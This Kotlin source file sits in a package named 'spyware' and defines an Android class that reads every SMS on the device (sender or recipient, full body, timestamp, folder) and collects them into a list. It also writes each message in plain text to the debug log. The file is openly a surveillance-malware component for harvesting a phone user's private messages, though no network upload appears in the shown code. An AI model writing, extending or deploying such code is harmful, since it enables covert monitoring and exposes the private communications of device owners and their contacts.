package com.mhl.spyware

import android.annotation.SuppressLint
import android.content.Context
import android.database.Cursor
import android.provider.Telephony
import android.util.Log
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class GetSms(private val context: Context) {


    @SuppressLint("Range")
    fun getSMS(): List<SmsMessage> {
        val uri = Telephony.Sms.CONTENT_URI
        val projection = arrayOf(
            Telephony.Sms.ADDRESS,
            Telephony.Sms.BODY,
            Telephony.Sms.DATE,
            Telephony.Sms.TYPE
        )

        val sortOrder = "${Telephony.Sms.DATE} DESC"

        val cursor: Cursor? = context.contentResolver.query(uri, projection, null, null, sortOrder)

        val messages = mutableListOf<SmsMessage>()

        cursor?.let {
            while (it.moveToNext()) {
                val address = it.getString(it.getColumnIndex(Telephony.Sms.ADDRESS))
                val body = it.getString(it.getColumnIndex(Telephony.Sms.BODY))
                val date = it.getLong(it.getColumnIndex(Telephony.Sms.DATE))
                val type = it.getInt(it.getColumnIndex(Telephony.Sms.TYPE))

                val typeString = when (type) {
                    Telephony.Sms.MESSAGE_TYPE_INBOX -> "Inbox"
                    Telephony.Sms.MESSAGE_TYPE_SENT -> "Sent"
                    Telephony.Sms.MESSAGE_TYPE_DRAFT -> "Draft"
                    Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "Outbox"
                    else -> "Unknown"
                }

                val formattedDate = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(
                    Date(date)
                )

                messages.add(SmsMessage(address, body, formattedDate, typeString))

                Log.d("SMS", "From: $address, Date: $formattedDate, Type: $typeString, Message: $body")
            }
            it.close()
        } ?: run {
            Log.d("SMS", "No SMS found.")
        }

        return messages
    }
}

data class SmsMessage(
    val address: String,
    val body: String,
    val date: String,
    val type: String
)
